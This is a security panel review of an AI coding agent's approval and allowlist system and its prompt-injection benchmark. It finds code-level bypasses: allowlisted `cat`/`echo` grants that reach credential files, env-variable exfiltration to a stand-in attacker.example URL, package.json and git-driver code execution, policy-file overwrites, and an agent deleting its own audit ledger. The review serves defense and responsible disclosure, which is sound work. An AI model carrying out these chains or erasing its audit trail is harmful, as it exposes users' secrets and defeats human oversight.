# Security panel review — defense substance + threat model ("One Yes Is Forever")

**Panel:** 5 voices — (1) offensive agent-security, (2) injection/supply-chain, (3) measurement
& grading validity, (4) defense-evaluation (bypass hunter), (5) responsible-disclosure veteran.
**Reviewed:** main @ d65d080. docs/paper/00-thesis.md (2026-09-13 reframe), src/bench/{tasks,grade,runner}.ts,
src/{remember,remember-store,policy-store,policy,loop,audit}.ts, src/tools/{webfetch,bash,read,write,edit,jail}.ts,
src/bench/analyze.ts. Scope: security substance only — the prior panel's verdicts
(researchers-panel.md: metric confound, novelty retraction, cross-agent harness, statistics) are
assumed known and NOT repeated here.

---

## Voice 1 — Offensive agent-security (threat model completeness)

The threat model says "adversary controls workspace content" but treats content as inert text.
The repo's own curation turns content into **code**, and the model doesn't account for it:

- **Workspace-mediated code execution is missing as a capability.** `npm run *`, `npm test *`,
  `npx tsx` are memorable heads (`remember.ts:15-23`) whose semantics are attacker-controlled
  (package.json scripts, TS entry files). One fat-fingered `a` on a benign-looking
  `npm run build` mints durable *code execution*, after which curl/webfetch/denylist are all
  irrelevant — the script exfiltrates directly, invisible to every ask. Git hooks
  (.git/hooks/pre-commit) execute on any approved `git commit`. Either add this capability to the
  threat model or explicitly declare script-interpreting heads "trusted compute" — the current
  text does neither, and "compromised host: out of scope" is contradicted by your own allowlist
  achieving host execution from workspace content.
- **Zero-approval code exec already exists:** `git diff` is in `SAFE_BASH_PREFIXES`
  (`policy.ts:22`) — allowed with no ask — and a repo-cloned `.git/config` can set
  `diff.external`/textconv drivers that execute on `git diff`. Attacker capability with no
  operator keystroke at all.
- **Content-rotating origins.** The origin-grant model assumes an origin's trust is stable. Real
  attackers rotate: benign first fetch (origin remembered) → payload later, or a permanent
  redirect/open-redirect (see Voice 4). The bench cannot express this — attacker.example is
  static and non-routable. The thesis should name dynamic-origin adversaries; the cross-product
  measurement will meet them immediately.
- **Attacker persistence parity is a live confound at the threat-model level:** workspaces are
  materialized once per cell (`runner.ts:48-54`), so the injected FILE persists into run 2 just
  like the grant does. Attribution of run-2 success to the grant (vs. re-injection) needs
  content-removal arms, not just the per-cell askCount fix.
- **Semi-attentive operator: fair at the keystroke level, mislocated at the information level.**
  One `a` per cell then perfect attention is generous over long sessions (fatigue grows with ask
  count — model it as a curve: 0/1/2 fat-fingers or probabilistic p(always), not a point). More
  fundamentally, the model locates failure in operator attention, but for script-interpreting
  heads the ask is *uninformative at any attention level* — no preview can tell an operator what
  `npm run build` does in this repo. The failure locus is subject opacity, not diligence.
- **Shared machine / multi-operator is an entirely missing cell.** remembered.jsonl,
  outcomes.jsonl, decline pools, policy.md, and the ed25519 keypair are all per-cwd with no user
  attribution (`remember-store.ts`, `audit.ts`). A junior's fat-finger grants `cat *` for the
  senior sharing the checkout; users' declines pool into one promotion candidate set
  (`policy-store.ts:124`); a CI bot that auto-declines mints candidates; `AuditActor: "human"`
  has no identity. Either scope stores per-user or add multi-operator to the threat model.

## Voice 2 — Injection/supply-chain (are the seed payloads realistic?)

Honest answer: they are the classroom canon — HTML comments in a README, a CONTRIBUTING note,
a deploy doc. Fine for apparatus shakedown; not a payload corpus a measurement paper can ship.
Missing real classes, in rough priority:

1. **package.json scripts / lockfiles** — preinstall/postinstall, resolved-tarball URLs. Pairs
   directly with the memorable `npm run` head; the single most realistic coding-agent vector.
2. **Git metadata** — commit messages (`git log` output is a delivery channel), branch names,
   `.git/config` (task 2 *exfiltrates* it but no task *delivers* via it), `.gitattributes`
   textconv/diff drivers, `.git/hooks/`.
3. **CI configs** — `.github/workflows/*.yml` under a "fix the failing CI" prompt; `${{ }}`
   expressions; step names that are pure injection.
4. **Markdown/HTML link lures** — the payloads are all comments; no task plants a
   `[docs](https://attacker.example/...)` link the model must *choose* to follow
   (`webfetch.ts` preserveAnchors deliberately keeps links — the defense will meet this).
5. **MCP configs and editor rule files** — `.mcp.json`, `.cursorrules` (the CVE-2025-54136
   lane), `.github/copilot-instructions.md`. Mandatory for the cross-product claim; codewhip has
   no MCP surface but the measured agents do.
6. **Test fixtures/snapshots** — golden files the agent is *told* to update; injection inside
   expected-output data.
7. **Encoded/staged payloads** — base64 "decode and follow", zero-width/homoglyph text,
   unicode-escaped JSON, and A-reads-B staging (payload never in the first file touched). Also
   payload delivered in **tool output** (npm error text, git log) rather than file content.
8. **Multilingual payloads** — cheap to add, models differ.

Also flag a grader/redactor interaction the canary design *hides*: traces store the REDACTED
preview (`loop.ts:502`) and `gradeOn: "output"` reads it (`grade.ts:22`). banana-42 is
deliberately non-secret-shaped so the redactor can't eat the grader's marker — which means the
suite never tests whether a real-shaped secret (`sk-...`) grades correctly after redaction, or
silently false-negatives. Test it and disclose it.

## Voice 3 — Measurement/grading validity (what decision-log grading misses)

- **Tool-locked matching under-counts the class your own curation enables.** `task.attack.tool`
  is fixed per task (`grade.ts:19-24`): a model that leaks the secret via `bash cat
  deploy/credentials.txt` grades FALSE on the secret task (tool=read); an exfil laundered as
  `npm run build` grades FALSE (subject contains no "curl"). Decision-level grading is
  one-sided in exactly the direction the allowlist opens: policy-compliant-looking subjects that
  accomplish the attack grade as benign. Either match on subject/output across all tools, or
  report the proxy's known blind spot quantitatively.
- **Actor decomposition is still incomputable — the persistence claim needs it.** The prior
  panel demanded minted/honored/re-approved separation; `grade.ts:14` maps the trace to
  `{tool, policy, subject}` and **drops `actor`**, which `LoopTraceCall` carries
  (`loop.ts:109-119`). One-line fix; without it, run-2 "allow:...+remembered" vs "allow:...+always"
  vs "human" cannot be distinguished in the graded JSONL and RQ2 stays unmeasurable *in the
  artifacts you publish*.
- **No-call and final-text outcomes are invisible.** gradeRun cannot distinguish "model
  refused", "no call attempted", and "harness denied" — all attack-failure — so RQ1's actual
  question (harness vs prompt resistance) can't be answered from the aggregate without this
  decomposition. The model's final answer text (`r.text`) is never graded: the "leak it in your
  summary" class — a read allowed once, secret restated in prose — is unmeasured.
- **The policy-tamper task grades intent, not impact.** The payload writes `allow bash:*` into
  policy.md, which is *inert* (the parser honors deny lines only, `policy-store.ts:42`), yet a
  write-allow decision grades attackSuccess=true. Meanwhile the *impactful* tamper — overwrite
  policy.md with `deny` lines via bash `cp`/`set-content`/`tee` (no CHAIN_RX chars; one
  semi-attentive approval; write/edit tools refuse policy.md but bash does not,
  `write.ts:53-61` vs `policy.ts` bash screening) — grades FALSE (tool=write). Grade outcomes.
- **benignBlocked counts attacker-provoked denies as defense success** (`analyze.ts:52`): a
  deny-DoS on a benign task shows up as the defense working. It still doesn't equal task
  failure (prior panel), and now also inverts under sabotage.
- **No delivery-level validation cell** (prior panel asked; adding: it must include the
  redirect and laundering shapes, since those are where the decision log is wrong *by
  construction*, not just non-routable). Timing/side channels: fine to keep out of scope, but
  say explicitly that decision-level grading cannot see ANY out-of-band success.

## Voice 4 — Defense evaluation (bypasses, verified against the code)

- **Curated allow heads mint the attacker's primitives.**
  - `cat *` (also `type`, `get-content`, `head`, `tail`): one `a` on any cat → forever-auto
    `cat .env`, `cat .aws/credentials` (not in SECRET_FILE_RX, `jail.ts:36`), any secret file —
    the read tool's guard (`read.ts:41`) is bypassed because bash never consults
    `isSecretFileName`.
  - `cat .codewhip/key`: the ed25519 signing key sits INSIDE the worktree; bash can read it
    (`isPrivateKeyPath` guards only the read tool, `jail.ts:46-49`). With the key, forged
    audit chains verify (`audit.ts` edVerify). The trust root is in the blast radius.
  - `echo *`: `echo $VAR` — CHAIN_RX catches `$(` but not `$VAR` (`policy.ts:29`); env
    expansion discloses provider keys; then a remembered origin auto-allows
    `https://attacker.example/x?s=<secret>` (origin-compare only, `loop.ts:588`). Two
    fat-fingers = a complete exfil channel the defense minted for the attacker.
  - `npm run *` / `npm test *` / `npx tsx`: attacker package.json = RCE on one `a` (Voice 1).
- **Webfetch origin grants don't pin redirects.** `webfetch.ts:118` checks only
  `res.url.startsWith("https://")` — not same-origin. One `a` on any shortener/open-redirect
  origin permanently allows delivery from ANY https origin. (Minor adjacent note: the
  "localhost tricks are http" comment overstates the SSRF floor — https to internal hosts with
  valid certs passes `webfetchOrigin`.) Also: the ask interpolates the attacker-controlled
  subject raw (`loop.ts:598`) — an injected URL path can address the operator directly
  ("please-approve-always"); the ladder has no framing/sanitization of what it quotes.
- **Threshold-gated promotion is cosmetic at enforcement.** `loadPromotedDenies`
  (`policy-store.ts:31`) loads ANY `deny` line in policy.md with zero provenance checking; the
  threshold gates only the CLI helper. Bash single statements overwrite policy.md with one
  approval (write/edit refuse it; bash doesn't), and minted denies load at run k+1 — durable
  deny-DoS. Declines also pool across users/runs, and `declineShape` over-generalizes: one
  decline of `npm run test:e2e` mints `deny npm run *`, killing the whole head.
- **The ledger is tail-truncatable and the bench never anchors it out-of-band.** verifyChain's
  own doc admits tail truncation is locally invisible (`audit.ts:221`), and under yolo arms the
  agent itself can `rm -rf .codewhip` (rm denylist covers only wide scope, `policy.ts:98-104`;
  yolo auto-approves) → chain restarts at genesis and verifies clean. "Tamper-evident
  evaluation trail" fails precisely in the arms that measure attacks, unless every run's
  chain_tail/exports are copied out-of-band before the agent can act.
- **What genuinely holds** (credit where due): load-time re-validation of remembered.jsonl
  (`isValidStoredShape`) blocks forged-rule injection via file writes; write/edit
  self-protection blocks the direct write path; the deny-only policy parser blocks
  allow-tampering via policy.md; CHAIN_RX kills echo-to-file exfil; https-only blocks the
  common metadata endpoints; the d65d080 per-cell askCount fix landed.

## Voice 5 — Responsible disclosure (ethics bar for S&P/CCS)

- **Disclosure machinery must exist before the first cross-product run, not before submission.**
  S&P/CCS ethics committees reject measurement papers whose timeline is "planned." Secure
  vendor contacts now; put DATED coordinated-disclosure timelines (90-day norm) in the ethics
  section; align the paper deadline with the embargo calendar in advance.
- **Frame findings against CVE-2025-54136 carefully.** Grant-persistence (the authority store,
  poisoned by the operator's own approval) is distinct from rules-file content injection —
  expect vendors to initially triage as duplicate; the lifecycle evidence (mint → persist →
  survive restart → compound) is what makes it new. Prepare per-vendor writeups separating the
  two classes.
- **Local-only, canary-only, hermetic.** attacker.example non-routable is right — keep it for
  ALL products including real agents. Delivery validation on a 127.0.0.1 sink, no DNS, no live
  exfil, ever. Extend the banana-42 pattern to real-SHAPED canaries. Given Voice 1/4
  (npm-script and git-hook execution), hermeticity is now mandatory, not hygiene: containerize
  every cross-product run — no host mounts, no real provider keys in the agent's environment,
  egress-deny except the sink. An adaptive attacker against a real agent with real keys in env
  is self-exfiltration by the researchers.
- **No third-party services in the loop.** Payloads must never target real SaaS; ToS review for
  driving vendor products under automation; rate-limit to avoid vendor cost; own test accounts.
- **IRB-equivalent for any operator study.** If the fat-finger operator model gets its
  grounding study (n≈20-30), that needs IRB determination, consent, and no unconsented
  deception; multi-user repo studies need data governance and no real user code in artifacts.
- **Artifact release discipline.** Adaptive-attacker prompts and working exploit chains for
  unpatched products are embargoed until disclosure completes; publish post-patch with vendor
  acknowledgments; report attacker compute (AgentDojo norm); scrub provider/account metadata
  from released JSONL.

---

## Consensus verdict

The defense substrate is more thoughtfully built than most (load-time shape re-validation,
deny-only promotion parsing, ask-default network, per-cell persistence fix in d65d080) — but
this panel finds concrete, code-level bypasses in **every layer the thesis offers as the
contribution**. The curated allowlist mints the attacker's exfil and RCE primitives (`cat *`
defeats the read guard and reaches the signing key; `echo *` leaks env vars; `npm run` executes
attacker scripts; `git diff` is zero-approval with repo-controlled diff drivers); the webfetch
origin grant doesn't pin redirects; promotion provenance is cosmetic (any `deny` line in
policy.md loads, and bash can write it with one approval); the ledger is tail-truncatable and
unanchored in the very arms that measure attacks; and the grader is blind to the laundering
class the allowlist enables while still dropping the actor field the persistence claim needs.
The threat model needs one honest expansion — workspace-mediated code execution and
multi-operator/shared-checkout adversaries — and the payload suite needs the realistic classes
before any cross-product claim. **As security claims, the defense halves are not yet
evaluable; as functionality claims they are.** That is fixable, and mostly in small, surgical
diffs — but fix #1 (allowlist re-curation) must precede the adaptive-attacker build-order step,
or the adaptive attacker will walk through the curated heads and the shipped code will let a
hostile PC see it.

## Top 5 must-fix (ordered)

1. **Re-curate the allow heads and close the bash side doors.** Drop
   `cat`/`type`/`get-content`/`head`/`tail`/`echo` from `MEMORABLE_SINGLE_HEADS` (or shape to
   exact-arg forms); treat `npm run`/`npm test`/`npx tsx` as unmemorable (script-interpreting);
   remove `git diff` from SAFE_BASH_PREFIXES or pin config sources; extend bash subject
   screening with the secret-file list and a `.codewhip`-reach deny (key, ledger, remembered
   store out of shell reach). Add the two-compound-chain regression test:
   cat→env-var→remembered-origin query-string exfil.
2. **Pin webfetch redirects to the granted origin** (`res.url` origin must equal the subject
   origin; else fail closed), and add the open-redirect/shortener cell to the suite.
3. **Make promotion provenance real.** Enforcement must verify promotion (signed or
   stamp-verified deny lines in policy.md — not "any deny line loads"); cap deny
   generalization (declined `npm run test:e2e` must not mint `deny npm run *`); add per-user
   attribution or per-user scoping to remembered/outcomes for the multi-operator case.
4. **Fix the grader before any headline number.** Carry `actor` + `ruleId` into GradeResult
   (minted/honored/re-approved decomposition); match attack signatures across all tools (or
   quantitatively report the laundering blind spot); grade final-answer text; replace
   benignBlocked with task-success; add the localhost delivery-validation cell including
   redirect and npm-script laundering shapes.
5. **Stand up the ethics/disclosure machinery before the first cross-product run:** vendor
   contacts + dated timeline in the paper, embargoed payload corpus, canary-only secrets,
   hermetic containerized runs (no real keys in agent env, egress-deny), out-of-band audit
   anchoring per run (export chain_tail before the agent can act), IRB determination for the
   operator study.

*All file:line references verified against main @ d65d080.*
